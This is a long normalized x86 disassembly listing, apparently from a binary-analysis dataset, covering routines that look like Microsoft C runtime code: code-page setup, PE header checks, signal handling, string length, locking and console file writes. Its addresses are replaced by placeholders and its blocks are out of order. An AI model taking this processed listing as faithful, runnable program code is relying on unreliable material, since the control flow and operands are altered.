mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_40756b
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_40767a
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_406ba0
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_407611
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_40756b
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_407c50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407ca0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4055b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_407d60
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_407c50
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_407d60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_407d91
push esi
push 0x4
push 0x20
call sub_407122
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_407dc0
push 0xc
push r--data
call sub_405550
call sub_404a52
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_407e00
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407dfa
mov eax esi
call sub_405595
retn
sub_407e00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_40b05f
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_4071b5
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_4071b5
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_407f2d
push 0x24
push r--data
call sub_405550
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_404700
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_4080e2
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_4049c8
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_405595
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_406fa9
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4080a8
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_4080e2
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_408120
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4081c4
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_4058af
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_4058af
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
sub_408282
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_406cf3
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_408470
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_408500
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40b485
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40b4a4
jmp r-xdata
sub_408500
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_404072
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_408470
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_408562
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_408592
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4085c2
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_407122
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_407122
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_408662
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_406fa9
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4086a1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_406fa9
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_4086d1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40710d
pop ecx
pop ebp
retn
sub_40870b
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_40710d
pop ecx
pop ebp
retn
sub_408738
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_4087a4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4058af
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_4058af
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_405a91
mov eax esi
sub_408801
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
pop ebp
retn
sub_408825
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_408879
push 0x10
push r--data
call sub_405550
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_40b544
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_40587b
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40895b
add esp 0xc
mov edi eax
jmp r-xdata
call sub_405595
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408932
mov eax edi
jmp r-xdata
sub_40895b
push ebp
mov ebp esp
mov eax 0x1af0
call sub_40b730
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_40587b
and [ eax ] edi
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_404072
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_40587b
and [ eax ] edi
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_408825
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_409281
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_4046e8
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_4058af
mov [ eax ] 0x1c
call sub_40587b
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_40588e
pop ecx
jmp r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_40587b
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
